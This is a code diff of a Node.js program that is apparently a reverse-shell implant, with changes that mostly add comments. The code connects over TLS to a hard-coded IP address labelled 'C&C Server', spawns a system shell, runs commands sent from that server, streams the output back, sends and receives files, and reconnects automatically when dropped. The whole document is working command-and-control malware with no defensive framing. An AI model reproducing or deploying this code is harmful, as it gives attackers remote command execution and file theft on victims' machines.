@@ -15,15 +15,17 @@ const _options = {
 }
 
 // flag variable to let the client know if it needs to reconnect to the server
-const _fsPort = 2223
-const _comPort = 2222
-const _host = '51.222.157.180'
+const _fsPort = 2223 // File socket port
+const _comPort = 2222 // Communication Socket port
+const _host = '51.222.157.180' // C&C Server
 const _shellType = "sh" //cmd.exe, zsh, sh
+// ===========================================================================
 
-// let comClient = {}
+// Global variables
 let fsClient = {}
 let comAlive = false
 let connID
+// ===========================================================================
 
 /**
  * WriteFile takes destination and creates a new filestream which is written to by the fsClient stream
@@ -81,19 +83,17 @@ const sendFile = (localFile) => {
  * Function: Spawns a zsh/cmd/sh child process and streams the stdout back to client socket
  * @param {socket} comClient 
  */
-const shellSpawn = (comClient) => { //client, fsClient
+const shellSpawn = (comClient) => {
     const shell = child.spawn(_shellType, []); 
 
     shell.stdout.on('data', (data) => {
         if (comClient) {
-            // console.log(data)
             comClient.write(data)
         }
     });
 
     shell.stderr.on('data', (data) => {
         if (comClient) {
-            // console.log(data)
             comClient.write(data)
         }
     });
@@ -108,6 +108,9 @@ const shellSpawn = (comClient) => { //client, fsClient
      * if the first character is 0 : execute as a shell command
      * if the first character is 1 : write to console 
      * if the first character is 2 : reset the shell child process
+     * if the first character is 3 : recieve file from server
+     * if the first character is 4 : resync the connection ID
+     * if the first character is 5 : send file to server
      */
      comClient.on('data', (data) => {
         let msg = data.toString()
@@ -152,22 +155,26 @@ const asyncCall = (callback) => new Promise((resolve) => {
  * @param {object} tlsCerts 
  * @param {socket} comClient 
  * @param {function} cb 
- * @returns 
+ * @returns socket
  */
 const fsServerConnect = (PORT, HOST, tlsCerts, comClient, cb) => {
     const client = tls.connect(PORT, HOST, tlsCerts)
 
+    // Connection is established to server
     client.on('secure', () => {
         console.log(`Connected to port ${PORT}`)
         if (cb) {
             cb(client)
         }
+
+        // If the communication socket is alive and connection ID has been assigned, resync it (important for filesockets)
         if(comAlive && connID) {
             console.log(connID)
             client.write('_+4' + connID)
         }
     })
 
+    // if the file socket dropped, attempt to reconnect
     client.on('close', () => {
         console.log(`${PORT} connection closed... reconnecting...`)
         client.destroy()
@@ -193,11 +200,12 @@ const fsServerConnect = (PORT, HOST, tlsCerts, comClient, cb) => {
  * @param {number} PORT 
  * @param {string} HOST 
  * @param {object} tlsCerts 
- * @returns 
+ * @returns socket
  */
 const comServerConnect = (PORT, HOST, tlsCerts) => {
     const client = tls.connect(PORT, HOST, tlsCerts)
 
+    // On Successful TLS socket connection, spawn shell
     client.on('secure', async () => {
         comAlive = true
         console.log(`Connected to port ${PORT}`)
@@ -207,6 +215,7 @@ const comServerConnect = (PORT, HOST, tlsCerts) => {
         shellSpawn(client)
     })
     
+    // On socket close, attempt to reconnect
     client.on('close', () => {
         comAlive = false
         connID = undefined
@@ -229,7 +238,5 @@ const comServerConnect = (PORT, HOST, tlsCerts) => {
 
     return client
 }
-
-//===========================
 
 comServerConnect(_comPort, _host, _options)
